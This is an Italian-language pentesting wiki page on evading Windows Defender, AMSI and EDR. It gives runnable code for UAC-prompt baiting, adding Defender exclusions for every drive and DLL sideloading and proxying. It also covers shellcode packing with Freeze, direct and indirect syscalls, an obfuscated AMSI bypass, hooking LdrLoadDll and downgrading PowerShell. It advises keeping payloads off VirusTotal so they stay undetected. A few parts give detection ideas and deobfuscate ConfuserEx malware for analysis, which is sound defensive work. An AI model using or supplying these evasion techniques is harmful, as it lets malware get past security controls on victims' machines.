# Bypass dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata inizialmente scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrestare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire a Windows Defender di funzionare, fingendo di essere un altro AV.
- [Disabilitare Defender se si è admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di gioco vengono spesso distribuiti come installer Node.js/Nexe non firmati che prima **chiedono all'utente di ottenere privilegi elevati** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando ha esito positivo solo quando chi lo esegue dispone di diritti di admin, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviarlo immediatamente con il verbo `RunAs` per attivare la richiesta di consenso UAC prevista, mantenendo la riga di comando originale.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Le vittime credono già di installare software “crackato”, quindi di solito accettano il prompt, concedendo al malware i diritti necessari per modificare la policy di Defender.<sup>[[26]](#references)</sup>

### Esclusioni globali di `MpPreference` per ogni lettera di unità

Una volta ottenuti privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare direttamente il servizio. Il loader termina prima il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`), quindi imposta **esclusioni estremamente ampie**, rendendo non scansionabili ogni profilo utente, directory di sistema e disco rimovibile:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Osservazioni chiave:

- Il ciclo attraversa ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro salvato in qualunque punto del disco viene ignorato**.
- L’esclusione dell’estensione `.sys` è una misura preventiva: gli attacker si riservano la possibilità di caricare driver non firmati in seguito, senza dover intervenire di nuovo su Defender.
- Tutte le modifiche vengono salvate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le esclusioni persistano o di ampliarle senza attivare nuovamente l’UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli superficiali sullo stato continuano a segnalare che “l’antivirus è attivo”, anche se l’ispezione in tempo reale non controlla mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di evasione dell’AV**

Attualmente, gli AV usano metodi diversi per verificare se un file è dannoso: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico avviene individuando stringhe o sequenze di byte dannose note in un binario o script e ricavando informazioni dal file stesso (ad es. descrizione del file, nome dell’azienda, firme digitali, icona, checksum, ecc.). Ciò significa che usare strumenti pubblici noti può farvi individuare più facilmente, perché probabilmente sono già stati analizzati e segnalati come dannosi. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se cifri il binario, l’AV non potrà rilevare il tuo programma, ma ti servirà una sorta di loader per decifrare ed eseguire il programma in memoria.

- **Offuscamento**

A volte basta modificare alcune stringhe nel binario o nello script per aggirare l’AV, ma il processo può richiedere molto tempo, a seconda di cosa stai cercando di offuscare.

- **Strumenti personalizzati**

Se sviluppi i tuoi strumenti, non esisteranno firme dannose note, ma ci vorranno molto tempo e impegno.

> [!TIP]
> Un buon metodo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, divide il file in più segmenti e chiede a Defender di analizzarli singolarmente: in questo modo può indicarti esattamente quali stringhe o byte nel binario vengono segnalati.

Ti consiglio vivamente di guardare questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull’evasione pratica degli AV.

### **Analisi dinamica**

L’analisi dinamica si verifica quando l’AV esegue il binario in una sandbox e osserva eventuali attività dannose (ad es. tentare di decifrare e leggere le password del browser, eseguire un minidump di LSASS, ecc.). Questa parte può essere un po’ più complicata, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell’esecuzione** A seconda di come viene implementata, questa può essere un’ottima tecnica per aggirare l’analisi dinamica degli AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell’utente, quindi le attese prolungate possono ostacolare l’analisi dei binari. Il problema è che molte sandbox degli AV possono saltare l’attesa, a seconda di come è implementata.
- **Controllare le risorse della macchina** Di solito le sandbox hanno pochissime risorse a disposizione (ad es. < 2 GB di RAM), altrimenti potrebbero rallentare la macchina dell’utente. Puoi anche dare libero sfogo alla creatività: ad esempio, controllare la temperatura della CPU o persino la velocità delle ventole. Non tutto verrà simulato nella sandbox.
- **Controlli specifici della macchina** Se vuoi prendere di mira un utente la cui workstation è unita al dominio "contoso.local", puoi controllare il dominio del computer per verificare che corrisponda a quello specificato; se non corrisponde, puoi far terminare il programma.

A quanto pare, il nome del computer della sandbox di Microsoft Defender è HAL9TH. Puoi quindi controllare il nome del computer nel tuo malware prima della detonazione: se il nome corrisponde a HAL9TH, significa che sei nella sandbox di Defender, quindi puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per aggirare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo già detto in questo post, gli **strumenti pubblici** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno noto, che esegue anch’esso il dump di LSASS?

Probabilmente la risposta giusta è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Il progetto in sé è davvero interessante, ma aggirare gli AV usando questo strumento è un incubo: cerca quindi alternative per ottenere ciò che ti serve.

> [!TIP]
> Quando modifichi i payload per eludere i rilevamenti, assicurati di **disattivare l'invio automatico dei campioni** in Defender e, sul serio, **NON CARICARE IL FILE SU VIRUSTOTAL** se il tuo obiettivo è riuscire a eludere i rilevamenti nel lungo periodo. Se vuoi verificare se un determinato AV rileva il tuo payload, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXE vs DLL

Quando possibile, **privilegia sempre l’uso delle DLL per l’evasione**. Per esperienza, i file DLL vengono di solito **rilevati e analizzati molto meno**, quindi in alcuni casi è un semplice trucco per evitare il rilevamento (se, naturalmente, il tuo payload può essere eseguito come DLL).

Come possiamo vedere nell’immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi per rendere i file DLL molto più furtivi.

## DLL Sideloading & Proxying

Il **DLL Sideloading** sfrutta l’ordine di ricerca delle DLL usato dal loader, collocando l’applicazione vittima e i payload dannosi nella stessa directory.

Puoi individuare i programmi vulnerabili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Questo comando mostrerà l'elenco dei programmi soggetti a DLL hijacking in "C:\Program Files\\" e dei file DLL che tentano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi vulnerabili a DLL Hijack/Sideload**: se eseguita correttamente, questa tecnica è piuttosto stealth, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti farti individuare facilmente.

Il semplice posizionamento di una DLL malevola con il nome di quella che un programma si aspetta di caricare non caricherà il tuo payload, poiché il programma si aspetta di trovare funzioni specifiche all'interno della DLL. Per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo di gestire l'esecuzione del payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Ecco i passaggi che ho seguito:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

L'ultimo comando ci fornirà 2 file: un modello del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un Detection rate di 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Consiglio vivamente** di guardare il [VOD di S3cur3Th1sSh1t su Twitch](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire ciò di cui abbiamo parlato.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che in realtà sono dei "forwarder": invece di puntare al codice, la voce di export contiene una stringa ASCII nel formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` al suo interno

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (ad esempio ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta effettuando l'inoltro.

Questo consente una primitiva di sideloading indiretta: trovare una DLL firmata che esporta una funzione inoltrata a un modulo il cui nome non è una KnownDLL, quindi collocare nella stessa directory quella DLL firmata e una DLL controllata dall'attaccante, con il nome esatto del modulo di destinazione dell'inoltro. Quando viene invocato l'export inoltrato, il loader risolve l'inoltro e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta seguendo il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un `DllMain` minimale per eseguire codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Attiva l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento osservato:
- rundll32 (firmato) carica la `keyiso.dll` side-by-side (firmata)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, si ottiene un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export forwarded il cui modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export forwarded con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l’inventario dei forwarder di Windows 11 per cercare possibili candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento e la difesa:
- Monitora i LOLBins (ad es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di DLL non KnownDLLs con lo stesso nome base da quella directory
- Genera un avviso per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dagli utenti
- Applica policy di integrità del codice (WDAC/AppLocker) e nega i permessi di scrittura ed esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit per payload che consente di bypassare gli EDR usando processi sospesi, syscall dirette e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento e, se possibile, prova a concatenare più tecniche di evasione.

## Direct/Indirect Syscalls & Risoluzione SSN (SysWhispers4)

Gli EDR spesso inseriscono **hook inline in user-mode** negli stub syscall di `ntdll.dll`. Per aggirare questi hook, puoi generare stub syscall **direct** o **indirect** che caricano l'**SSN** (System Service Number) corretto e passano alla modalità kernel senza eseguire l'entrypoint dell'export sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza accedere agli export di `ntdll`).
- **Indirect**: salta a un gadget `syscall` esistente all'interno di `ntdll`, così la transizione al kernel sembra originare da `ntdll` (utile per l'evasione euristica); **randomized indirect** seleziona un gadget da un pool per ogni chiamata.
- **Egg-hunt**: evita di incorporare sul disco la sequenza statica di opcode `0F 05`; individua una sequenza syscall in fase di esecuzione.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub syscall in base all'indirizzo virtuale invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dalla relativa sezione `.text`, quindi rimuove la mappatura (aggira tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la convalida degli opcode quando uno stub è pulito; se è sottoposto a hook, ricorre alla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` in fase di esecuzione, senza analizzare byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per impedire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo **i file su disco**; quindi, se si riusciva in qualche modo a eseguire payload **direttamente in memoria**, l'AV non poteva impedirlo, perché non disponeva di visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- Controllo dell'account utente, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di esaminare il comportamento degli script, esponendone il contenuto in una forma non crittografata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` genera il seguente avviso in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota che aggiunge `amsi:` seguito dal percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo salvato alcun file su disco, ma siamo stati comunque rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene analizzato da AMSI. Questo riguarda anche `Assembly.Load(byte[])` per caricare codice da eseguire in memoria. Per questo motivo, per l'esecuzione in memoria si consiglia di usare versioni precedenti di .NET (come la 4.7.2 o inferiori) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI si basa principalmente su rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se hanno più livelli; quindi, l'offuscamento potrebbe essere una cattiva opzione, a seconda di come viene eseguito. Questo rende l'elusione tutt'altro che immediata. A volte, però, basta modificare un paio di nomi di variabili per risolvere il problema: dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo powershell (e anche in cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche con un utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere l'analisi di AMSI.

**Forzare un errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) impedisce l'avvio di qualsiasi scansione per il processo corrente. La tecnica è stata divulgata inizialmente da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più ampio.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

È bastata una riga di codice PowerShell per rendere AMSI inutilizzabile nel processo PowerShell corrente. Naturalmente, questa riga è stata rilevata da AMSI stesso, quindi è necessario modificarla per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Tieni presente che probabilmente verrà segnalato una volta pubblicato questo post, quindi non dovresti pubblicare codice se il tuo obiettivo è restare inosservato.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile dell'analisi dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG. In questo modo, il risultato della scansione effettiva sarà 0, interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche per aggirare AMSI con powershell. Per saperne di più, consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Bloccare AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stata caricata nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'applicare un hook in user-mode a `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e il processo non esegue scansioni.<sup>[[23]](#references)</sup>

Schema dell'implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e loader personalizzati (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti lunghi nella riga di comando.
- È stato usato con loader eseguiti tramite LOLBins (ad es. `regsvr32` che chiama `DllRegisterServer`).

Anche lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI evitando il rilevamento delle signature tramite funzioni definite dall'utente con nomi casuali, variabili, espressioni di caratteri e uso casuale di maiuscole e minuscole nelle keyword di PowerShell.

**Rimuovere la signature rilevata**

Puoi usare strumenti come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona analizzando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola con istruzioni NOP, rimuovendola così dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che AMSI li analizzi. Puoi fare così:

```bash
powershell.exe -version 2
```

## Registrazione di PowerShell

La registrazione di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per scopi di audit e risoluzione dei problemi, ma può anche rappresentare un **problema per gli attacker che vogliono eludere il rilevamento**.

Per aggirare la registrazione di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare la trascrizione e la registrazione dei moduli di PowerShell**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) a questo scopo.
- **Usare PowerShell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione PowerShell non gestita**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). In questo modo si eludono i controlli legati specificamente al processo `powershell.exe`, ma non si disabilitano intrinsecamente AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, che aumenterà l'entropia del binario e renderà più facile il suo rilevamento da parte degli AV e degli EDR. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deoffuscare binari .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune imbattersi in diversi livelli di protezione che bloccano i decompiler e le sandbox. Il workflow riportato di seguito **ripristina in modo affidabile un IL quasi originale**, che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1. Rimozione dell'anti-tampering – ConfuserEx cifra ogni *corpo del metodo* e lo decifra all'interno del costruttore statico del *modulo* (`<Module>.cctor`). Modifica anche il checksum PE, in modo che qualsiasi modifica causi l'arresto anomalo del binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), utili per creare un proprio unpacker.

2.  Recupero dei simboli / del flusso di controllo – passa il file *pulito* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flag:
     • `-p crx` – seleziona il profilo ConfuserEx 2
     • de4dot annullerà il control-flow flattening, ripristinerà i namespace, le classi e i nomi delle variabili originali e decifrerà le stringhe costanti.

3.  Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (noti anche come *proxy call*) per rendere ancora più difficile la decompilazione. Rimuovili con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Dopo questo passaggio, dovresti vedere normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante con dnSpy e cerca grandi blocchi Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *payload* effettivo.  Spesso il malware lo memorizza come array di byte codificato in TLV e inizializzato all'interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza** dover eseguire il sample malevolo: utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx crea un attributo personalizzato denominato `ConfusedByAttribute`, utilizzabile come IOC per classificare automaticamente i sample.

#### Comando su una riga
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite [offuscamento del codice](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione dalle manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator mostra come usare il linguaggio `C++11/14` per generare codice offuscato in fase di compilazione, senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di metaprogrammazione dei template C++, rendendo un po' più difficile la vita di chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore di binari x64 in grado di offuscare diversi file PE, tra cui .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice granulare per i linguaggi supportati da LLVM che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni normali in catene ROP, contrastando la nostra naturale concezione del normale flusso di controllo.
